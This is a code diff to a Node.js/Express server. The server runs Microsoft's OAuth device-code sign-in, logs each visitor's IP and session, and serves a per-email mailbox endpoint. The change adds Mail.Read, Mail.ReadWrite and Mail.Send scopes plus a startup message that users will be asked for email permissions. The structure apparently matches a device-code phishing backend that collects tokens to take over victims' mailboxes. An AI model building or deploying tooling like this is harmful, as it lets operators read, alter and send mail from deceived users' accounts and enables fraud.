@@ -45,7 +45,7 @@ function getClientIp(req) {
 }
 
 // ============================================
-// START AUTHENTICATION
+// START AUTHENTICATION - WITH MAIL SCOPES
 // ============================================
 app.post('/start', async (req, res) => {
     try {
@@ -58,10 +58,11 @@ app.post('/start', async (req, res) => {
         
         console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
         
+        // UPDATED SCOPE: Added Mail.Read, Mail.ReadWrite, Mail.Send for mailbox access
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read offline_access'
+                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -375,7 +376,8 @@ app.get('/api/mail/folders/:email', async (req, res) => {
         });
         res.json(response.data);
     } catch (err) {
-        res.status(500).json({ error: 'Failed to fetch folders' });
+        console.error('Folders error:', err.response?.data);
+        res.status(500).json({ error: 'Failed to fetch folders: ' + (err.response?.data?.error?.message || err.message) });
     }
 });
 
@@ -487,5 +489,6 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.ht
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
+    console.log(`✅ Mail scopes enabled - Users will be asked for email permissions`);
     console.log(`========================================\n`);
 });
